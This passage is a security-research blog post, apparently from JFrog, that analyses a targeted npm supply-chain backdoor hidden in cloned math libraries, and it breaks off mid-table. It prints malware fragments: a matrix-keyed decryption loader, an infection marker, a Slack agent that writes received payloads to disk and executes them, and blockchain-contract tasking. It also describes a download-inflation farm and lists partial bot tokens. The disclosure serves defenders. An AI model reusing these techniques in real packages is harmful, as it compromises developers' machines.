@@ -1,0 +1,659 @@
+<!DOCTYPE html>
+<html data-html-server-rendered="true" lang="en" data-vue-tag="%7B%22lang%22:%7B%22ssr%22:%22en%22%7D%7D">
+  <head>
+    <title>Equation of Compromise: Anatomy of a Live npm Supply-Chain Campaign - JFrog Security Research</title><meta name="gridsome:hash" content="a39bf090344e2dafef61ece71312d7493df41394"><meta data-vue-tag="ssr" charset="utf-8"><meta data-vue-tag="ssr" name="generator" content="Gridsome v0.7.23"><meta data-vue-tag="ssr" data-key="viewport" name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"><meta data-vue-tag="ssr" data-key="format-detection" name="format-detection" content="telephone=no"><meta data-vue-tag="ssr" name="referrer" content="origin"><meta data-vue-tag="ssr" http-equiv="Content-Security-Policy" content="default-src *  &#x27;self&#x27; &#x27;unsafe-eval&#x27; &#x27;unsafe-inline&#x27;  https://jfrog.com; img-src &#x27;self&#x27; * data: ; font-src &#x27;self&#x27; * data: ;"><meta data-vue-tag="ssr" name="title" content="Equation of Compromise: Anatomy of a Live npm Supply-Chain Campaign | JFrog"><meta data-vue-tag="ssr" name="description" content="JFrog Security Research uncovered a targeted npm campaign hidden in cloned math libraries. The backdoor activates only for a specific matrix, receives encrypted tasks through an Ethereum Sepolia smart contract and Slack, and uses a GitHub Actions worker farm to manufacture hundreds of thousands of downloads."><link data-vue-tag="ssr" rel="icon" href="data:,"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="16x16" href="/assets/static/favicon.ce0531f.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="32x32" href="/assets/static/favicon.ac8d93a.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="96x96" href="/assets/static/favicon.b9532cc.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="76x76" href="/assets/static/favicon.f22e9f3.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="152x152" href="/assets/static/favicon.62d22cb.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="120x120" href="/assets/static/favicon.1539b60.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="167x167" href="/assets/static/favicon.dc0cdc5.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="180x180" href="/assets/static/favicon.7b22250.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="alternate" type="application/rss+xml" title="JFrog Security Research RSS" href="https://research.jfrog.com/rss.xml"><link data-vue-tag="ssr" rel="alternate" type="application/rss+xml" title="JFrog Security Real Time Posts RSS" href="https://research.jfrog.com/post/rss.xml"><link data-vue-tag="ssr" rel="alternate" type="application/rss+xml" title="JFrog Security Vulnerabilities RSS" href="https://research.jfrog.com/vulnerabilities/rss.xml"><link rel="preload" href="/assets/css/0.styles.72978b25.css" as="style"><link rel="preload" href="/assets/js/app.ab729a36.js" as="script"><link rel="preload" href="/assets/js/page--src--templates--real-time-post-vue.1835e8c8.js" as="script"><link rel="prefetch" href="/assets/js/page--src--pages--404-vue.77816cba.js"><link rel="prefetch" href="/assets/js/page--src--pages--index-vue.26ecc880.js"><link rel="prefetch" href="/assets/js/page--src--pages--malicious-packages-vue.9729db36.js"><link rel="prefetch" href="/assets/js/page--src--pages--model-threats-vue.665a81e3.js"><link rel="prefetch" href="/assets/js/page--src--pages--oss-vue.d10a00b3.js"><link rel="prefetch" href="/assets/js/page--src--pages--post-vue.516655ae.js"><link rel="prefetch" href="/assets/js/page--src--pages--vulnerabilities-vue.8cc82e2b.js"><link rel="prefetch" href="/assets/js/page--src--templates--model-threats-post-vue.5c3697db.js"><link rel="prefetch" href="/assets/js/page--src--templates--post-vue.4c4529f0.js"><link rel="prefetch" href="/assets/js/vendors~page--src--pages--index-vue.a1240508.js"><link rel="prefetch" href="/assets/js/vendors~page--src--templates--model-threats-post-vue~page--src--templates--real-time-post-vue.e9de0f00.js"><link rel="prefetch" href="/assets/js/vendors~page--src--templates--real-time-post-vue.00c2c8e5.js"><link rel="stylesheet" href="/assets/css/0.styles.72978b25.css"><script data-vue-tag="ssr" type="text/javascript">(function(){try{var k='theme',d=document.documentElement,m=window.matchMedia&&window.matchMedia('(prefers-color-scheme: dark)').matches,s=localStorage.getItem(k),t=s==='dark'||s==='light'?s:(m?'dark':'light');d.classList.toggle('dark',t==='dark');}catch(e){}})();</script><script data-vue-tag="ssr" src="/speedsize-local.js"></script><script data-vue-tag="ssr" src="https://transcend-cdn.com/cm/f0071674-c641-4cf3-9d31-303ec0c86b1b/airgap.js" data-languages="en" data-tracker-overrides="GoogleConsentMode:security_storage=on;ad_storage=SaleOfInfo,Advertising;ad_user_data=SaleOfInfo,Advertising;ad_personalization=SaleOfInfo,Advertising;analytics_storage=Analytics,SaleOfInfo;functionality_storage=Functional,SaleOfInfo;personalization_storage=Functional,SaleOfInfo" data-cfasync="false" type="text/javascript" charset="utf-8"></script><script data-vue-tag="ssr" type="text/javascript" charset="utf-8">
+      window.dataLayer = window.dataLayer || [];
+      function gtag() {
+        dataLayer.push(arguments);
+      }
+      gtag("js", new Date());
+      gtag("config", "GTM-T6MF8M");
+      gtag('set', 'developer_id.dODQ2Mj', true);
+    </script><script data-vue-tag="ssr" type="application/ld+json" data-key="ld-json-tech-article">{"@context":"https://schema.org","@type":"TechArticle","headline":"Equation of Compromise: Anatomy of a Live npm Supply-Chain Campaign","description":"JFrog Security Research uncovered a targeted npm campaign hidden in cloned math libraries. The backdoor activates only for a specific matrix, receives encrypted tasks through an Ethereum Sepolia smart contract and Slack, and uses a GitHub Actions worker farm to manufacture hundreds of thousands of downloads.","datePublished":"2026-09-21","author":{"@type":"Person","name":"JFrog Security Research Team","jobTitle":"JFrog Security Researcher","affiliation":{"@id":"https://jfrog.com/#organization"}},"publisher":{"@id":"https://jfrog.com/#organization"},"mainEntityOfPage":"https://research.jfrog.com/post/equation-of-compromise/","proficiencyLevel":"Expert","image":"https://research.jfrog.com/img/RealTimePostImage/post/equation-of-compromise/image1.png"}</script><script data-vue-tag="ssr" type="application/ld+json">{"@context":"https://schema.org","@type":"Organization","@id":"https://jfrog.com/#organization","name":"JFrog","legalName":"JFrog Ltd.","url":"https://jfrog.com/","logo":{"@type":"ImageObject","url":"https://research.jfrog.com/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg"}}</script><noscript data-vue-tag="ssr"><style>.g-image--loading{display:none;}</style></noscript>
+  </head>
+  <body >
+    <div data-server-rendered="true" id="app" class="layout min-h-screen bg-white dark:bg-gray-900 transition-colors duration-200"><header class="py-2 main-header dark:bg-gray-900"><div class="container mx-auto px-2"><div class="flex w-full justify-between items-center"><div class="left flex-1 min-w-0"><div class="flex min-w-0 items-center gap-2"><a href="/" class="logo active"><img alt="JFrog Security Research" src="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg" width="40" srcset="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg 40w" sizes="(max-width: 40px) 100vw, 40px" class="g-image"></a><span class="site-name small truncate dark:text-gray-200">JFrog Security Research</span></div></div><div class="right flex-shrink-0"><div class="hidden sm:block desktop-menu-wrapper"><ul class="top-menu flex items-center"><li class="menu-item"><a href="/model-threats/" class="font-bold px-3 dark:text-gray-200">
+      Model Threats
+    </a><a href="/vulnerabilities/" class="font-bold px-3 mx-3 dark:text-gray-200">
+      Discover
+    </a></li><li class="flex items-center mr-2"><button type="button" aria-pressed="false" aria-label="Toggle dark mode" title="Toggle dark mode" class="theme-toggle ui-icon-button"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg></button></li><li><a href="https://twitter.com/JFrogSecurity" target="_blank" rel="noreferrer noopener noreferrer" class="sr-button px-3 py-2 inline-flex gap-2">
+  Follow JFrog Security
+  <img alt="twitter" src="/assets/static/twitter.e0519be.9769aec62433fd58c76ad32c2d613842.svg" width="14" srcset="/assets/static/twitter.e0519be.9769aec62433fd58c76ad32c2d613842.svg 14w" sizes="(max-width: 14px) 100vw, 14px" class="g-image"></a></li></ul></div><div class="sm:hidden flex mobile-menu-wrapper items-center"><!----><button type="button" aria-label="Open menu" aria-haspopup="dialog" aria-expanded="false" class="show-menu-hamburger ui-icon-button"><svg xmlns="http://www.w3.org/2000/svg" width="22" height="16" viewBox="0 0 22 16" fill="none" aria-hidden="true"><path d="M0 1C0 0.447715 0.447715 0 1 0H21C21.5523 0 22 0.447715 22 1C22 1.55228 21.5523 2 21 2H1C0.447716 2 0 1.55228 0 1Z" fill="currentColor"></path><path d="M0 8C0 7.44772 0.447715 7 1 7H21C21.5523 7 22 7.44772 22 8C22 8.55228 21.5523 9 21 9H1C0.447716 9 0 8.55228 0 8Z" fill="currentColor"></path><path d="M0 15C0 14.4477 0.447715 14 1 14H21C21.5523 14 22 14.4477 22 15C22 15.5523 21.5523 16 21 16H1C0.447716 16 0 15.5523 0 15Z" fill="currentColor"></path></svg></button></div></div></div></div><div class="fixed mobile-menu h-screen w-screen z-50 bg-white dark:bg-gray-900 text-gray-700 dark:text-gray-200 p-5 inset-0" style="display:none;"><div class="flex items-center justify-between gap-4 mb-3 pb-3 border-b border-gray-200 dark:border-gray-700"><div class="flex items-center gap-3"><span class="text-xs font-bold uppercase tracking-wide text-gray-500 dark:text-gray-400">Theme</span><button type="button" aria-pressed="false" aria-label="Toggle dark mode" title="Toggle dark mode" class="theme-toggle ui-icon-button"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg></button></div><button type="button" aria-label="Close menu" class="ui-icon-button"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 12 12" fill="none" aria-hidden="true"><path d="M1 1L11 11" stroke="currentColor" stroke-width="2"></path><path d="M11 1L1 11" stroke="currentColor" stroke-width="2"></path></svg></button></div><ul class="mobile-menu-list"><li class="py-4 px-2 border-t border-gray-200 dark:border-gray-600"><a href="/" class="text-gray-700 dark:text-gray-200 active">
+        Home
+      </a></li><li class="py-4 px-2 border-t border-gray-200 dark:border-gray-600"><a href="/model-threats/" class="text-gray-700 dark:text-gray-200">
+        Model Threats
+      </a></li><li class="py-4 px-2 border-t border-gray-200 dark:border-gray-600"><a href="/vulnerabilities/" class="text-gray-700 dark:text-gray-200">
+        Discover
+      </a></li><li class="py-4 px-2 border-t border-gray-200 dark:border-gray-600"><a href="https://twitter.com/JFrogSecurity" target="_blank" rel="noopener noreferrer" class="text-gray-700 dark:text-gray-200">
+        Follow JFrog Security
+      </a></li></ul></div></header><main><div class="latest-posts"><div class="container pt-5 pb-10"><h1 class="mt-3 pb-0">Equation of Compromise: Anatomy of a Live npm Supply-Chain Campaign</h1><p class="mt-1 mb-5 green">JFrog Security Research Team | 21 Sep, 2026</p><div class="post-content-wrapper real-time-theme"><section class="latest-posts-single-post-content text-black dark:text-gray-200"><h1 id="equation-of-compromise-anatomy-of-a-live-npm-supply-chain-campaign"><a href="#equation-of-compromise-anatomy-of-a-live-npm-supply-chain-campaign" aria-hidden="true" tabindex="-1"><strong>Equation of Compromise: Anatomy of a Live npm Supply-Chain Campaign</strong></a></h1>
+<p><img src="/img/RealTimePostImage/post/equation-of-compromise/image1.png"></p>
+<p>Over the past week, several vendors have reported on malicious npm packages that, taken one at a time, look like separate incidents. In this article, we present our research into the campaign behind all of them, starting with analysis of the latest encrypted loader detected by <a href="https://safedep.io/mathmain-encrypted-loader/" target="_blank" rel="nofollow noopener noreferrer">SafeDep</a>. Unlike most malware, this one doesn't run for everybody who installs it, and requires a very specific cryptographic operation to be performed, allowing us to assume it's a targeted operation, maybe an interview campaign. The payload decrypts only when the victim solves a linear system with one specific matrix, takes its orders from a smart contract on the Ethereum Sepolia testnet, keeps a second command channel open over Slack, and hides behind download counts manufactured by a farm of GitHub Actions workers.</p>
+<p>The teardown below covers recovering the trigger key, what the implant does once it runs, how the contract enrolls and tasks victims, the Slack agent, the download factory, and the entire campaign operating accounts behind it for the six months.</p>
+<p><strong>It started with a math library</strong></p>
+<p>mathsbase is a straight copy of the popular <a href="https://www.npmjs.com/package/mathjs" target="_blank" rel="nofollow noopener noreferrer">mathjs</a> library: same code, same README, different name. What was off was the popularity of six million downloads two days after publication, and not a single package depending on it<strong>.</strong></p>
+<p><img src="/img/RealTimePostImage/post/equation-of-compromise/image2.png"></p>
+<p>api.npmjs.org · 4 weeks, 24 Aug – 20 Sep 2026</p>
+<p>The 1.0.1 tarball carries four files that do not exist anywhere in upstream mathjs:</p>
+<table>
+<thead>
+<tr>
+<th align="left">File under lib/cjs/utils/</th>
+<th align="left">Size</th>
+<th align="left">What it is</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left">event.js</td>
+<td align="left">small</td>
+<td align="left">AES-256-GCM loader</td>
+</tr>
+<tr>
+<td align="left">graph.js</td>
+<td align="left">31 KB</td>
+<td align="left">base64 blob</td>
+</tr>
+<tr>
+<td align="left">fraction.js</td>
+<td align="left">12 KB</td>
+<td align="left">base64 blob</td>
+</tr>
+<tr>
+<td align="left">bignumber/type.js</td>
+<td align="left">1.5 MB</td>
+<td align="left">base64 blob</td>
+</tr>
+</tbody>
+</table>
+<p>Three encrypted blobs and a loader, but no key. So we pulled it apart.</p>
+<h2 id="breaking-it-open"><a href="#breaking-it-open" aria-hidden="true" tabindex="-1"><strong>Breaking it open</strong></a></h2>
+<p>The loader in utils/event.js is simple: it takes a password, derives a key from it with a functionscrypt that turns a password of any length into a fixed 32-byte key,  then decrypts the payload from graph.js with AES-256-GCM, writes the plaintext to disk, and executes it with require.</p>
+<p>Each encrypted file is laid out as salt[16] | iv[12] | tag[16] | ciphertext: a 16-byte salt, a 12-byte IV, a 16-byte authentication tag, then the encrypted payload. All four sit in the file in the clear and are required as input for the AES-256-GCP decrypt routine. </p>
+<p>What the file does not contain is the one input that has to be secret: the password the key is derived from. Salt, IV, and tag are the public parameters of the encryption; the password is the only thing the attacker did not ship. The only question is what feeds it.</p>
+<p>The loader function is called from the file utils/is.js, from a function that has no counterpart in upstream mathjs:</p>
+<pre><code class="language-js">function isGraph(x) {  const name = _event.validEvent("IapMCmvlemBnFaU+...", JSON.stringify(x));  const mod  = require(_event.event(path.join(__dirname, name), JSON.stringify(x)));  return x &#x26;&#x26; mod.validGraph(JSON.stringify(x)) || false;}
+</code></pre>
+<p>isGraph() is reached from lusolve(), the function that solves a system of linear equations, through two modified files. When a developer calls the exported math.lusolve(A, b), lusolve factors the matrix with math.lup(A), gets back L, U, p and q, and calls the internal _lusolve(), which solves the system and produces the answer exactly as upstream does. Only after that result exists does an injected line in lusolve.js call removeSolveValidation(L._data), a function added to solveValidation.js that does not exist upstream. Inside it, a second injected line calls isGraph() on the same array, which serializes it to a JSON string and hands that string to the loader as the password. <strong>That array is the key.</strong></p>
+<p>The placement is deliberate. The hook runs after the mathematical work is finished, and the return value of removeSolveValidation is assigned to a variable that is never read again, so the malicious call cannot change the output. The developer's answer is always correct.</p>
+<pre><code class="language-js">password  = JSON.stringify(L._data)key       = scryptSync(password, salt, 32)plaintext = AES-256-GCM(key, iv, tag, ciphertext)
+</code></pre>
+<p>No key ships with the package. The victim's own numerical workload supplies it at runtime, in a line as unremarkable as const weights \= math.lusolve(A, b). Any other matrix fails GCM authentication, the loader swallows the exception, and require() chokes on base64 inside a code path where errors are already routine.  The malware is filtering for the only people it wants: developers who call lusolve as a matter of course. Judging by that trigger and by the DeFi-flavoured lure packages, the intended audience is quantitative and DeFi developers, though we never recovered a payload to confirm it.</p>
+<p>So we had to guess the matrix. The search space is arbitrary arrays of doubles, but AES-GCM gives a free oracle: the authentication tag either verifies or it does not, with no false positives, at about 50 ms per candidate. We enumerated structured matrices (identities, small integer matrices, textbook examples) and let the tag decide. It was the <strong>3×3 symmetric Pascal matrix</strong>:</p>
+<pre><code class="language-js">A = [[1,1,1],[1,2,3],[1,3,6]]math.lup(A).L._data → [[1,0,0],[1,1,0],[1,0.5,1]]
+</code></pre>
+<p>That string decrypts the first blob to a filename, graph.js, and from there the whole package opened up.</p>
+<h2 id="what-was-inside"><a href="#what-was-inside" aria-hidden="true" tabindex="-1"><strong>What was inside</strong></a></h2>
+<p>graph.js is the orchestrator. It turns a one-off decryption into a persistent implant in four steps.</p>
+<p><strong>It uses the LICENSE file as a lock.</strong> Before anything else, it reads the package's own LICENSE file and looks for a line that has no business being in a licence:</p>
+<pre><code class="language-js">if (license.includes("REDISTRIBUTION REQUIRES INCLUSION OF THIS LICENSE.")) {  process.exit(1);   // already infected — stop here}fs.appendFileSync(licensePath, "\nREDISTRIBUTION REQUIRES INCLUSION OF THIS LICENSE.");
+</code></pre>
+<p>It is an infection marker hidden in the one file nobody reads. Deleting the line is also how the malware later uninstalls itself.</p>
+<p><strong>Then it detaches.</strong> It respawns itself as a background process (detached: true, stdio: "ignore", unref()), so the developer's script finishes and the implant keeps running.</p>
+<p><strong>After that it phones home.</strong> It collects platform, hostname, CPU count, memory and uptime, formats them as a Markdown block titled *🖥️ System Report*, and posts it to a Slack channel and a Telegram chat. Both credentials sit in the file as plain base64. This is the only outbound traffic graph.js ever sends, and nothing ever comes back on either channel.</p>
+<p><strong>And finally, it gets an identity on the Ethereum blockchain.</strong> The operator wants to send instructions to one infected machine that nobody else can read, and wants no server that can be seized. For that, they're using a smart contract on the Sepolia testnet. Reading a contract is free and anonymous; writing to one needs a funded wallet. So the implant generates an X25519 keypair, then fetches a wallet the operator set aside for it. The wallet's private key sits encrypted in the contract, and unwrapping it takes two secrets joined with a *: the trigger password, and the version string of the assert devDependency in the victim's own package.json.</p>
+<pre><code class="language-js">const walletPassword = triggerPassword + "*" + getNPwd();   // getNPwd() = pkg.devDependencies?.assertconst address    = await contractRead.getLastActiveCwAddress();const encrypted  = await contractRead.getCwPrivatePublic(address);const privateKey = await decryptAESGCM(encrypted, walletPassword);
+</code></pre>
+<p>bootstrapWallet then checks that the decrypted value looks like a private key and that the address it derives matches the one the contract named. Neither secret works alone, so the wallet only opens on a machine that installed the package and ran the trigger. A researcher holding the tarball cannot obtain a working identity.</p>
+<p>With a wallet in hand, the implant writes its public key into the contract as a check-in. The operator reads it, derives a shared secret, and from then on every task is encrypted for that one machine.</p>
+<p>The other two blobs are supporting cast. <strong>bignumber/type.js</strong>, the 1.5 MB one, is a bundled copy of <strong>ethers.js v5.7.2</strong>, shipped so the implant has a Web3 client without touching node_modules. <strong>fraction.js</strong> is the Slack agent, covered below. </p>
+<h2 id="command-and-control-on-a-testnet"><a href="#command-and-control-on-a-testnet" aria-hidden="true" tabindex="-1"><strong>Command and control on a testnet</strong></a></h2>
+<p>The implant's primary command channel is not a server. It is a smart contract on the <strong>Sepolia test network</strong>, used as a dead drop. A C2 server has an IP address, a hosting provider, and an abuse desk; a contract has none of those, cannot be taken down once deployed, and on a testnet costs nothing to use. The implant reads it through ordinary public RPC endpoints, so the traffic looks like a developer's own Web3 work.</p>
+<h3 id="enrollment"><a href="#enrollment" aria-hidden="true" tabindex="-1"><strong>Enrollment</strong></a></h3>
+<p>The contract runs a small membership system. The operator adds the victim's wallet address to an allowlist and stores an encrypted private key for it on-chain; the implant unwraps that key as described above and only then announces itself by writing its public key into the contract. The compiler left the failure messages in the bytecode:</p>
+<pre><code class="language-js">"Not whitelisted""No active whitelisted address""Caller is not the owner"
+</code></pre>
+<p>That discipline has an accidental consequence: <strong>the operators kept a public register of their own victims.</strong> </p>
+<p>The campaign ran on fourteen smart contracts, deployed by five operator wallets between 2026-03-05 and 2026-09-16: thirteen on Ethereum Sepolia and one on Base Sepolia. Eight contracts were actively used and had enrolled victims, the other six took no more than two hosts each and served as rehearsals. All fourteen are verified on-chain under one of three names, <code>WalletDataRegistry</code>, <code>WebDataRegistry</code> and <code>WalletHelloWorld</code>, and searching the explorer for those names returns every deployment regardless of who made it. The verified source reads as a single codebase developed over six months with one compiler, solc 0.8.20. Every deployment was edited and recompiled, leaving thirteen distinct source variants across fourteen contracts. The contracts were not replaced one at a time: in June, three of them ran in parallel under three different wallets, and packages published months apart point at the same deployment.</p>
+<p><img src="/img/RealTimePostImage/post/equation-of-compromise/image3.png"></p>
+<p>eth-sepolia.blockscout.com · all 1,060 successful transactions to the contract, 18 Jun – 14 Sep 2026</p>
+<h3 id="tasking"><a href="#tasking" aria-hidden="true" tabindex="-1"><strong>Tasking</strong></a></h3>
+<p>The operator writes a payload into two storage slots on the contract (split purely for size); writing the second slot emits an event; the implant has been subscribed to that event since it started. It reads both halves, decrypts them with its own private key and joins them, then writes the result to t utils/subwatcher, marks it executable, and runs it. </p>
+<p><img src="/img/RealTimePostImage/post/equation-of-compromise/image4.png"></p>
+<p>payload downloading</p>
+<p>The fourteen contracts carried 1,080 taskings, preserved as 2,162 encrypted payloads. Each is sealed under a key shared by the operator and a single implant, and none can be decrypted.</p>
+<p>Payloads were built once and sent to many hosts. The first production contract delivered a single 14.5 KB payload 64 times in five days. A payload of about 19.6 KB appears on three contracts between March and August, roughly 250 times in all — consistent with one second stage kept in service for five months.</p>
+<p>On deployment day of the June contract, 21 test payloads growing from 2.7 KB to 18 KB, alongside 23 out-of-gas failures, mark the operator probing the transaction size limit. Full 20–28 KB second stages followed until August. From 31 August the contract carried only a uniform 919-byte payload.</p>
+<p><strong>We cannot read any of them.</strong> The payloads are encrypted with asymmetric cryptography, under a key that only two parties can derive. The operator derives it from their own private key and the implant's public key, read from the contract. The implant derives the same key from the operator's public key and its own private key, which is generated at infection time and lives only in the memory of the victim process, never on disk or on the chain. Every blob also uses a unique salt and IV, so there is no nonce reuse to attack. We recovered the entire delivery mechanism and none of the cargo. What the implant was ultimately told to do is the one question this investigation cannot answer.</p>
+<p>One curiosity: the contract also contains a complete on-chain file-storage system (chunked upload, metadata, file count). In five months, <strong>not one of those functions was ever called.</strong></p>
+<h2 id="a-second-channel-over-slack"><a href="#a-second-channel-over-slack" aria-hidden="true" tabindex="-1"><strong>A second channel over Slack</strong></a></h2>
+<p>The third blob, fraction.js, is a Slack agent. graph.js decrypts it and launches it as its own detached process on every infection, several steps before the wallet that the contract path requires:</p>
+<pre><code class="language-js">spawn(process.execPath, [slackAgent, slackSecret, String(process.pid), password], {  cwd: __dirname, detached: true, stdio: "ignore", windowsHide: true});
+</code></pre>
+<p>It is a separate channel with separate keys. The reporting bot in graph.js only writes; this one only reads, from a different channel, with a different bot. Its credentials are not in the file in readable form: the bot token and channel ID are AES-GCM encrypted under the trigger password, and the messages themselves are encrypted under a Diffie-Hellman secret computed against a server public key hardcoded in the malware. That is not the secret used for blockchain tasking, which is computed against a key fetched from the contract, so the two channels fail independently: cracking one gives you nothing on the other.</p>
+<pre><code class="language-js">reporting  (graph.js, plain base64, write-only)  bot      xoxb-11307403103236-{truncated}  channel  C0B8XPGCKQStasking    (fraction.js, AES-GCM encrypted, read-only)  bot      xoxb-11301867762550-{truncated}  channel  C0B8GEPFMK9  operator U0B91JWCVT6
+</code></pre>
+<p>The agent polls conversations. history every ten seconds. On startup, it records the timestamp of the latest message and only looks at messages posted after it arrived, so a new victim never replays the operator's back catalogue. It only acts on messages from one hardcoded user ID, so holding the token is not the same as being able to task implants.<br>
+<strong>The payload arrives as text.</strong> Nothing is downloaded: the agent reads the text and ts fields of a message and nothing else, and slack.com is the only hostname in the module. Each message body decrypts to a JSON packet in a small transfer protocol:</p>
+<table>
+<thead>
+<tr>
+<th align="left">Packet</th>
+<th align="left">Fields</th>
+<th align="left">Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left">{t:"s"}</td>
+<td align="left">id, name, total</td>
+<td align="left">begin a transfer</td>
+</tr>
+<tr>
+<td align="left">{t:"c"}</td>
+<td align="left">id, n, d</td>
+<td align="left">deliver chunk n</td>
+</tr>
+<tr>
+<td align="left">{t:"e"}</td>
+<td align="left">id</td>
+<td align="left">reassemble and run</td>
+</tr>
+</tbody>
+</table>
+<pre><code class="language-js">fs.writeFileSync(savePath, assembled, "utf8");   // ...utils/subwatcherfs.chmodSync(savePath, "755");runProcess(savePath);
+</code></pre>
+<p>Slack caps message length, so an executable is split across many messages and rebuilt on the victim. There is no practical ceiling on size. A body containing exitexitexit is treated as an order instead: the agent deletes the infection marker, kills its parent, and exits.</p>
+<h2 id="the-one-we-could-not-open"><a href="#the-one-we-could-not-open" aria-hidden="true" tabindex="-1"><strong>The one we could not open</strong></a></h2>
+<p>matrixflow-js@3.2.1 is an ml-matrix reskin with the same loader chain, hooked at the top of the exported solve(). It differs in one way that matters: where mathsbase keys on a value derived from the input (the LU factor), matrixflow-js keys on the caller's raw matrix, compared by SHA-256 against a constant. A key equal to the caller's own input will essentially never match by accident, so this trigger is not waiting for ordinary work: <strong>the input has to be supplied by the operator</strong>, as a demo script or a task handed to a contractor. We could not find it, and its payload is still sealed. Version 3.2.2, published a week later, quietly removed the loader.</p>
+<h2 id="following-the-accounts"><a href="#following-the-accounts" aria-hidden="true" tabindex="-1"><strong>Following the accounts</strong></a></h2>
+<p>The operators are disciplined about identity: one npm account per package, emails alternating between @proton.me and @outlook.com, accounts abandoned the moment a package is removed. Across every GitHub identity in the cluster, there are <strong>zero followers and zero following</strong>, and not one campaign repository has a stargazer. We mapped the cluster anyway, through the seams where that discipline failed.</p>
+<p><strong>A handle reused across providers.</strong> The npm account weed0 publishes from tinystar368@gmail.com; tinystar8, which published the backdoored mathsbase, uses tinystar368@proton.me. That single collision joined the DeFi persona packages to the malware cluster, and commit metadata confirmed it: the GitHub identity UmajiHidekata, which hosts the inflation tool and commits to its target list, signs as tinystar368@gmail.com. The tool itself was written by a fourth identity, andrewstory18, whose commit opens the repository's history.</p>
+<p><strong>Repositories, where they exist at all.</strong> Only two of the five malicious packages have a public GitHub repository behind them — tinystar8/mathsbase and mathubio/math-universe. allendev12 was deleted along with its account, and linnianping and robert92 never published one. Where a repository does exist it is a clone of the real project with its upstream history left intact: tinystar8/mathsbase carries all 5,694 mathjs commits, 3,674 of them still signed by mathjs's own author, with 136 mechanical rename commits by Blustdp layered on top. The effect is a repository that looks like a long-maintained library at a glance, and the rename commits are the only trace of the operators in it.</p>
+<p>That is also the limit of what the repositories tell us. <strong>None of the malicious code was ever committed to GitHub.</strong> We searched the full history of every repository in the cluster for the loader's primitives — scryptSync, aes-256-gcm, the beacon IP — and found nothing. The payload is injected at publish time and exists only in the npm tarball, which is why the repositories look clean to anyone who checks them instead of the package.</p>
+<h2 id="the-download-factories"><a href="#the-download-factories" aria-hidden="true" tabindex="-1"><strong>The download factories</strong></a></h2>
+<p>Millions of downloads in two days after release is not organic. Studying the repositories behind the accounts above uncovered the mechanism: a download farm in three public GitHub accounts, repositories worker1 through worker10, running on GitHub's own infrastructure.</p>
+<table>
+<thead>
+<tr>
+<th align="left">Operator</th>
+<th align="left">Repositories</th>
+<th align="left">First commit</th>
+<th align="left">Commits</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left">andrewstory18</td>
+<td align="left">worker1–10</td>
+<td align="left">2026-07-13</td>
+<td align="left">~4,800</td>
+</tr>
+<tr>
+<td align="left">davidbabcock96</td>
+<td align="left">job_worker1–10</td>
+<td align="left"><strong>2026-06-25</strong></td>
+<td align="left">5,317</td>
+</tr>
+<tr>
+<td align="left">azlanrahman322-creator</td>
+<td align="left">job-worker1–10</td>
+<td align="left">2026-07-01</td>
+<td align="left">5,225</td>
+</tr>
+</tbody>
+</table>
+<p>All of repositories ship an identical WASM decoder (md5 91e020c13cb97a6365135b53b0d0fe5f), every commit carries the message "Update commands from job_master"<strong>,</strong> and the two newer farms receive byte-identical commands.json pushes down to the individual download counts. That is one orchestrator fanning a single configuration out to multiple operators. job_master itself is not public, but its output is.</p>
+<p><img src="/img/RealTimePostImage/post/equation-of-compromise/image5.png"></p>
+<pre><code>downloads farm activity
+</code></pre>
+<p>Each repository holds the same four files:</p>
+<pre><code class="language-js">commands.json                       ← AES-encrypted package names + countsindex.js                            ← minified driverpkg/worker_wasm_bg.wasm             ← Rust decoder, 122 KB.github/workflows/run-worker.yml    ← runs index.js on every push
+</code></pre>
+<p>The driver decrypts a package name, resolves its tarball URL and downloads it count times at one-second intervals — then throws the bytes away. It only needs the request to complete so npm's telemetry records a download.</p>
+<p>The target list is encrypted so the repository never names its own victims:</p>
+<p>[</p>
+<pre><code class="language-json">  { "name": "JcrvKzoIHPVLKIOa4bS7SYwlHtYmQU2rFZhsCjVhU+Lxhc1DL4h+ZT9KXJuoIVHmIBwG", "count": 6882 },  { "name": "uIznVb+PhIo5qQ6z1dP587rkA9iHoJNZ07FlIruyN+FcqHTZi52L9BppZaPpTt/pWw4=", "count": 2261 }]
+</code></pre>
+<p>The encryption is not much of an obstacle: the AES-256-GCM key is compiled into the WASM in plain ASCII as npm_workvr_protect_key_v1. They encrypted the target list so the public repository would not name its own victims, then shipped the key in the same repository.<br>
+build_metadata_url is a pure string-to-string function. That recovered unique target packages and the full scheduling history. </p>
+<table>
+<thead>
+<tr>
+<th align="left">Package</th>
